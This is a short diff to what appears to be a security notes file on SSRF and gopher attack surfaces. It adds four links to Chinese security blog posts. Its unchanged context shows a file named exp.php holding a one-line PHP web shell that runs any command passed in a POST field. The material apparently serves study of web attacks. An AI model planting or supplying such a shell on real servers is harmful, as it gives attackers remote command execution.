@@ -19,6 +19,14 @@ http://www.sohu.com/a/300092789_609556
 
 https://blog.chaitin.cn/gopher-attack-surfaces/
 
+**https://www.cnblogs.com/Mikasa-Ackerman/p/11155779.html**
+
+https://joychou.org/web/phpssrf.html
+
+https://www.cnblogs.com/p0pl4r/p/10336501.html
+
+https://blog.csdn.net/sojrs_sec/article/details/100999908
+
 exp.php
 
 	<?php system($_POST[e]);?> 
